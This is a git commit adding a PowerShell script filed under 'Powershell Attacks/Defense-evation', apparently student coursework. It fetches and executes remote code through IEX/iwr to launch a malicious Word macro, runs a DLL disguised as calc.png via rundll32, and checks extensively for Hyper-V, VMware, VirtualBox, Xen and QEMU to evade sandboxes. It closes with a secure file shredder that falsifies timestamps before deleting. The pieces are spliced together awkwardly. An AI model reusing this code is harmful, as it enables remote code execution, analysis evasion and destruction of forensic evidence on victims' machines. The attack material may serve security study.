f418e592f2b8449fcfc4844be0107195e46bef92
chastin123 <97394577+chastin123@users.noreply.github.com>
2022-09-26 07:49:39 +0100

    DefenseEvation.ps1
    dasda

---
+++ Powershell Attacks/Defense-evation/DefenseEvation.ps1
@@ -0,0 +1,343 @@
+#Chastin Alarcon
+# Checks if the machine is a VM or not
+
+
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+Invoke-MalDoc -macroFile "C:\temp\macrocode2.txt" -officeProduct "Word" -sub "Exploit"
+    $ErrorActionPreference = "SilentlyContinue"
+    #Hyper-V
+    $hyperv = Get-ChildItem HKLM:\SOFTWARE\Microsoft
+rundll32.exe C:\Users\studentadmin\Downloads\calc.png, StartW
+    if (($hyperv -match "Hyper-V") -or ($hyperv -match "VirtualMachine"))
+        {
+            $hypervm = $true
+        }
+
+    if (!$hypervm)
+        {
+            $hyperv = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
+            if ($hyperv -match "vrtual")
+                {
+                    $hypervm = $true
+                }
+        }
+    
+    if (!$hypervm)
+        {
+            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
+            if ($hyperv -match "vrtual")
+                {
+                    $hypervm = $true
+                }
+        }
+            
+    if (!$hypervm)
+        {
+            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
+            if ($hyperv -match "vrtual")
+                {
+                    $hypervm = $true
+                }
+        }
+
+    if (!$hypervm)
+        {
+            $hyperv = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($hyperv -match "vmicheartbeat") -or ($hyperv -match "vmicvss") -or ($hyperv -match "vmicshutdown") -or ($hyperv -match "vmiexchange"))
+                {
+                    $hypervm = $true
+                }
+        }
+   
+    if ($hypervm)
+        {
+    
+             "This is a Hyper-V machine."
+    
+        }
+
+    #VMWARE
+
+    $vmware = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+    if (($vmware -match "vmdebug") -or ($vmware -match "vmmouse") -or ($vmware -match "VMTools") -or ($vmware -match "VMMEMCTL"))
+        {
+            $vmwarevm = $true
+        }
+
+    if (!$vmwarevm)
+        {
+            $vmware = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System\BIOS -Name SystemManufacturer
+            if ($vmware -match "vmware")
+                {
+                    $vmwarevm = $true
+                }
+        }
+    
+    if (!$vmwarevm)
+        {
+            $vmware = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
+            if ($vmware -match "vmware")
+                {
+                    $vmwarevm = $true
+                }
+        }
+
+    if (!$vmwarevm)
+        {
+            $vmware = Get-Process
+            if (($vmware -eq "vmwareuser.exe") -or ($vmware -match "vmwaretray.exe"))
+                {
+                    $vmwarevm = $true
+                }
+        }
+
+    if ($vmwarevm)
+        {
+    
+             "This is a VMWare machine."
+    
+        }
+    
+    #Virtual PC
+
+    $vpc = Get-Process
+    if (($vpc -eq "vmusrvc.exe") -or ($vpc -match "vmsrvc.exe"))
+        {
+        $vpcvm = $true
+        }
+
+    if (!$vpcvm)
+        {
+            $vpc = Get-Process
+            if (($vpc -eq "vmwareuser.exe") -or ($vpc -match "vmwaretray.exe"))
+                {
+                    $vpcvm = $true
+                }
+        }
+
+    if (!$vpcvm)
+        {
+            $vpc = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($vpc -match "vpc-s3") -or ($vpc -match "vpcuhub") -or ($vpc -match "msvmmouf"))
+                {
+                    $vpcvm = $true
+                }
+        }
+
+    if ($vpcvm)
+        {
+    
+         "This is a Virtual PC."
+    
+        }
+
+
+    #Virtual Box
+
+    $vb = Get-Process
+    if (($vb -eq "vboxservice.exe") -or ($vb -match "vboxtray.exe"))
+        {
+    
+        $vbvm = $true
+    
+        }
+    if (!$vbvm)
+        {
+            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
+            if ($vb -match "vbox_")
+                {
+                    $vbvm = $true
+                }
+        }
+
+    if (!$vbvm)
+        {
+            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
+            if ($vb -match "vbox_")
+                {
+                    $vbvm = $true
+                }
+        }
+
+    
+    if (!$vbvm)
+        {
+            $vb = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
+            if ($vb -match "vbox")
+                {
+                    $vbvm = $true
+                }
+        }
+
+
+
+    if (!$vbvm)
+        {
+            $vb = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
+            if ($vb -match "vbox")
+                {
+                     $vbvm = $true
+                }
+        }
+  
+
+    if (!$vbvm)
+        {
+            $vb = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($vb -match "VBoxMouse") -or ($vb -match "VBoxGuest") -or ($vb -match "VBoxService") -or ($vb -match "VBoxSF"))
+                {
+                    $vbvm = $true
+                }
+        }
+
+    if ($vbvm)
+        {
+    
+         "This is a Virtual Box."
+    
+        }
+
+
+
+    #Xen
+
+    $xen = Get-Process
+
+    if ($xen -eq "xenservice.exe")
+        {
+    
+        $xenvm = $true
+    
+        }
+    
+    if (!$xenvm)
+        {
+            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
+            if ($xen -match "xen")
+                {
+                    $xenvm = $true
+                }
+        }
+
+    if (!$xenvm)
+        {
+            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\DSDT
+            if ($xen -match "xen")
+                {
+                    $xenvm = $true
+                }
+        }
+    
+    if (!$xenvm)
+        {
+            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
+            if ($xen -match "xen")
+                {
+                    $xenvm = $true
+                }
+        }
+
+    
+    if (!$xenvm)
+        {
+           $xen = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($xen -match "xenevtchn") -or ($xen -match "xennet") -or ($xen -match "xennet6") -or ($xen -match "xensvc") -or ($xen -match "xenvdb"))
+                {
+                    $xenvm = $true
+                }
+        }
+
+
+    if ($xenvm)
+        {
+    
+         "This is a Xen Machine."
+    
+        }
+
+
+    #QEMU
+
+    $qemu = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
+    if ($qemu -match "qemu")
+        {
+    
+            $qemuvm = $true
+    
+        }
+    
+    if (!$qemuvm)
+        {
+        $qemu = Get-ItemProperty hklm:HARDWARE\DESCRIPTION\System\CentralProcessor\0 -Name ProcessorNameString
+        if ($qemu -match "qemu")
+            {
+                $qemuvm = $true
+            }
+        }    
+
+    if ($qemuvm)
+        {
+    
+         "This is a Qemu machine."
+    
+        }
+
+
+# By Threats Experts University
+#Deletes any type of files as long as you specify it.
+if ($args.Count -ne 1) {
+	Write-Host "Usage: .\file_shredder.ps1 <>";
+} else {
+	$size = 2048;
+	$buffer = $null;
+	$rng = $null;
+	$stream = $null;
+	$file = $null;
+	try {
+		$file = Get-Item $args[0].Trim() -ErrorAction SilentlyContinue;
+		if ($file -eq $null) {
+			Write-Host "Path does not exists";
+		} elseif ($file -isnot [IO.FileInfo]) {
+			Write-Host "Path specified is not a file";
+		} else {
+			$file.Attributes = "Normal";
+			$sectors = [Math]::Ceiling($file.Length / $size);
+			$buffer = New-Object Byte[] $size;
+			$rng = New-Object Security.Cryptography.RNGCryptoServiceProvider;
+			$stream = New-Object IO.FileStream($file.FullName, [IO.FileAccess]::Write);
+			# number of rewrites (seven)
+			for ($i = 0; $i -lt 7; $i++) {
+				$stream.Position = 0;
+				for ($j = 0; $j -lt $sectors; $j++) {
+					$rng.GetBytes($buffer);
+					$stream.Write($buffer, 0, $buffer.Length);
+				}
+			}
+			$stream.SetLength(0);
+			$stream.Close();
+			$file.CreationTime = "09/06/2069 04:20:00 AM";
+			$file.LastWriteTime = "09/06/2069 04:20:00 AM";
+			$file.LastAccessTime = "09/06/2069 04:20:00 AM";
+			$file.Delete();
+			Write-Host "File has been shredded successfully";
+		}
+	} catch {
+		Write-Host $_.Exception.InnerException.Message;
+	} finally {
+		if ($buffer -ne $null) {
+			$buffer.Clear();
+		}
+		if ($rng -ne $null) {
+			$rng.Dispose();
+		}
+		if ($stream -ne $null) {
+			$stream.Close();
+			$stream.Dispose();
+		}
+		if ($file -ne $null) {
+			Clear-Variable -Name "file";
+		}
+	}
+}
